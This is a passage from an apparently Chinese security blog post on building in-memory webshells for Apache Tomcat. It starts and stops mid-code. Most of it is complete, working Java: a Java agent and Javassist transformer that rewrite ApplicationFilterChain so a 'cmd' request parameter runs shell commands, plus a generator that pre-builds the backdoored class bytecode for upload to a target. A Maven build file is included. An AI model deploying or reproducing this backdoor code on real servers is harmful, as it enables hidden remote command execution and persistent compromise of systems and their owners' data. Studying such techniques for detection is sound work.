<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于字节码动态修改技术（Javaagent-Javassist）实现内存马"><a href="#基于字节码动态修改技术（Javaagent-Javassist）实现内存马" class="headerlink" title="基于字节码动态修改技术（Javaagent+Javassist）实现内存马"></a>基于字节码动态修改技术（Javaagent+Javassist）实现内存马</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><blockquote><p>试想如果我们能找到一些关键类，这些关键类是 <code>Tomcat</code> 或相关容器处理请求的必经类，也就是要掉用相关类的相关方法，就可以完全摆脱 <code>url</code> 的限制，那么我们再通过 <code>javaagent</code> 和 <code>javassist</code> 实现运行时 <strong>动态修改字节码来完成类的修改和重载</strong> ，从中修改某方法的实现逻辑，嵌入命令执行并且回显，那么是不是同样可以实现内存马呢！</p></blockquote><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>首先我们要找到 <code>Tomcat</code> 中请求处理的必经类也就是通用类。如：上文提到过 <code>Tomcat</code> 中的 <code>WEB</code> 组件<code>Filter</code> 的实现，是一个 <code>FilterChain</code> 的链式调用，对请求做层层过滤。上一个 <code>filter</code> 调用该链的下一个 <code>filter</code> 的时候是通过 <code>filterChain.doFilter</code> 方法实现的。</p><p>而 <code>filterChain.doFilter()</code> 底层调用的是 <code>ApplicationFilterChain.internalDoFilter()</code> 方法，而且 <code>tomcat</code> 自带默认的 <code>filter</code> ，因此任何代码都一定会走到 <code>ApplicationFilterChain.internalDoFilter()</code> 这里。</p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><p>这里我下面直接给出网上的代码，不知道为什么我总是像下面那篇文章一样复现不成功。总是报错 <code>class not found</code> 错误，即使我确定目标环境有那个类，最烦人的是有错误有时候目标靶机也不报错。但是我在后面想到了一个方法避免这个问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/05.%E5%86%85%E5%AD%98%E9%A9%AC/03.java%20agent%20%E5%86%85%E5%AD%98%E9%A9%AC#java-agent%E4%BF%AE%E6%94%B9dofilter</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AgentMain.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class cls : allLoadedClasses)&#123;</span><br><span class="line">            <span class="comment">// 定位到类</span></span><br><span class="line">            <span class="keyword">if</span> (cls.getName() == TransformerDemo.editClassName)&#123;</span><br><span class="line">                <span class="comment">// 添加Transformer</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 触发Transformer</span></span><br><span class="line">                inst.retransformClasses(cls);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerDemo.java</span></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">// addTransformer()的第一个参数需要ClassFileTransformer这个类的对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">editClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">editMethod</span> <span class="operator">=</span> <span class="string">&quot;doFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">memshell</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    javax.servlet.http.HttpServletRequest req =  $1;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    javax.servlet.http.HttpServletResponse res = $2;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    java.lang.String cmd = req.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;       System.out.println(cmd);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        try &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            java.lang.Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            e.printStackTrace();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    else&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        internalDoFilter(req,res);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加额外的类搜索路径</span></span><br><span class="line">        <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ClassClassPath</span> <span class="variable">classClassPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">            classPool.insertClassPath(classClassPath);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改方法doFilter()，返回 byte[] 字节码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(editClassName);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(editMethod);</span><br><span class="line">            ctMethod.insertBefore(memshell);</span><br><span class="line">            ctClass.writeFile(<span class="string">&quot;/Users/d4m1ts/d4m1ts/java/Temp/out/artifacts/temp_jar&quot;</span>);</span><br><span class="line">            System.out.println(memshell);</span><br><span class="line">            System.out.println(<span class="string">&quot;injection success&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.detach();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总是报错 <code>Class Not Found</code> ，那我们就尽量不要用其他的类。我们可以提前修改好 <code>ApplicationFilterChain</code> 这个类，将其修改后的字节码和 <code>agent.jar</code> 一样也上传到目标靶机。然后直接在 <code>transforme</code> 函数中读取这个文件中的字节码后返回，这样肯定就不会出现问题了。</p></blockquote><p>具体操作如下：</p><ol><li>先在本地创建好修改后的 <code>ApplicationFilterChain</code> 恶意类字节码。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="string">&quot;internalDoFilter&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> <span class="string">&quot;String command = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            if (command != null) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                try &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    java.io.PrintWriter printWriter = response.getWriter();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    String o = \&quot;\&quot;;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    ProcessBuilder p;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    if (System.getProperty(\&quot;os.name\&quot;).toLowerCase().contains(\&quot;win\&quot;)) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        p = new ProcessBuilder(new String[]&#123;\&quot;cmd.exe\&quot;, \&quot;/c\&quot;, command&#125;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &#125; else &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        p = new ProcessBuilder(new String[]&#123;\&quot;/bin/sh\&quot;, \&quot;-c\&quot;, command&#125;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    o = c.hasNext() ? c.next() : o;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    c.close();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    printWriter.write(o);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    printWriter.flush();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    printWriter.close();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(className);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(methodName);</span><br><span class="line"></span><br><span class="line">        method.insertBefore(evilCode);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.bin&quot;</span>);</span><br><span class="line">        fos.write(ctClass.toBytecode());</span><br><span class="line"></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694519202886.png"></p><ol start="2"><li>再在本地创建好 <code>agent.jar</code></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>agent-demo03<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>agent-demo03 Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--   跳过单元测试     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.test.skip</span>&gt;</span>true<span class="tag">&lt;/<span class="name">maven.test.skip</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义MANIFEST.MF --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.configuration.manifestFile</span>&gt;</span>src/main/resources/MANIFEST.MF<span class="tag">&lt;/<span class="name">maven.configuration.manifestFile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.29.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>D:\Java\jdk1.8.0_202\lib\tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--       就是把前面的配置的MANIFEST.MF打入jar中，以指定premain的位置，否则会报：</span></span><br><span class="line"><span class="comment">                         Failed to find Premain-Class manifest attribute in</span></span><br><span class="line"><span class="comment">            --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>$&#123;maven.configuration.manifestFile&#125;<span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">MyTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clz:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clz.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clz&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 